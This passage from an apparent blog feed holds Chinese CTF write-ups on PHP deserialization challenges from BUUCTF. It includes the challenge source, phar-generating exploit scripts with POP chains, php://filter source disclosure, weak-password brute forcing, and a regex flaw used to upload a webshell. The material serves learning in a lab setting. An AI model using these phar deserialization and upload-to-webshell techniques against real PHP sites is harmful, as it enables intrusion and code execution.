</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php中有一个很明显的POP链，此外，由于没有unserialize函数触发反序列化，那么就只能上传一个phar来触发反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$c1e4r-&gt;str = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line">$test-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line">$phar-&gt;setMetadata($c1e4r); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成exp.phar后改后缀为gif，然后查看上传的文件名</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000059.png" alt=""></p><p>最后使用phar协议读取该文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000157.png" alt=""></p><p>解码得到flag。</p><h2 id="GXYCTF2019-Babysqli-v3">GXYCTF2019 Babysqli v3</h2><h3 id="考点-v13">考点</h3><ul><li>弱口令</li><li>PHP反序列化</li></ul><h3 id="解题-v13">解题</h3><p>弱口令爆破。。。。。得到admin/password。</p><p>PHP伪协议读取源码<code>php://filter/read=convert.base64-encode/resource=home.php</code></p><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前引用的是 &quot;</span>.$file;</span><br><span class="line"><span class="keyword">require</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">上传文件</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Filename;</span><br><span class="line"><span class="keyword">public</span> $cmd;</span><br><span class="line"><span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"><span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="预期解">预期解</h4><p>Phar反序列化</p><p>先任意上传一个文件获得token的值</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122813.png" alt=""></p><p>生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Uploader();</span><br><span class="line">$upload-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">$upload-&gt;Filename = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">$upload-&gt;token = <span class="string">&#x27;GXY063c630ae7ab41c6fd121cb4851620a3&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($upload); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后将生成的phar上传</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123304.png" alt=""></p><p>得到路径<code>/var/www/html/uploads/cdc81ac06b78e980da728ecd95e747a8/GXY063c630ae7ab41c6fd121cb4851620a3.txt</code></p><p>然后将这个路径带上<code>phar://</code>作为name参数的值，再随意上传一个文件，因为<code>$this-&gt;Filename</code>被我们手工指定为phar，触发了phar反序列化导致命令执行。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123754.png" alt=""></p><h4 id="非预期解1">非预期解1</h4><p>关键的地方在于正则写的有问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上匹配的是<code> .</code>（空格点）。``upload()<code>内，只要文件小于1024，就将上传文件到</code>$this-&gt;Filename`</p><p>那我们只要使<code>$this-&gt;Filename</code>为<code>/var/www/html/uploads/shell.php</code>，然后上传一个txt的一句话即可getshell</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122133.png" alt=""></p><h4 id="非预期解2">非预期解2</h4><p>由于这行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents($uploader);</span><br></pre></td></tr></table></figure><p>上传后会显示出<code>$uploader</code>这个文件的内容，所以只要使<code>$this-&gt;Filename</code>为<code>flag.php</code> 然后随便传个东西就会得到flag了。</p><h2 id="MRCTF2020-Ezpop-Revenge">MRCTF2020 Ezpop_Revenge</h2><h3 id="TODO-v3">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF刷题——PHP反序列化&quot;&gt;BUUCTF刷题——PHP反序列化&lt;/h1&gt;
&lt;h2 id=&quot;LCTF2018-Bestphp’s-revenge&quot;&gt;LCTF2018 Bestphp’s revenge&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这篇文章分析
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>buuctf刷题——NodeJS</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS/</id>
    <published>2020-08-18T09:59:40.000Z</published>
    <updated>2020-08-18T11:22:57.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GKCTF2020-EZ三剑客-EzNode">GKCTF2020 EZ三剑客-EzNode</h2><h2 id="GYCTF2020-Node-Game">GYCTF2020 Node Game</h2><h2 id="GKCTF2020-Node-Exe">GKCTF2020 Node-Exe</h2><h2 id="GYCTF2020-Ez-Express">GYCTF2020 Ez_Express</h2><h2 id="HFCTF2020-EasyLogin">HFCTF2020 EasyLogin</h2><h2 id="HFCTF2020-JustEscape">HFCTF2020 JustEscape</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GKCTF2020-EZ三剑客-EzNode&quot;&gt;GKCTF2020 EZ三剑客-EzNode&lt;/h2&gt;
&lt;h2 id=&quot;GYCTF2020-Node-Game&quot;&gt;GYCTF2020 Node Game&lt;/h2&gt;
&lt;h2 id=&quot;GKCTF2020-Node-Exe
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="NodeJS" scheme="http://ca0y1h.top/categories/CTF/NodeJS/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——Python</title>
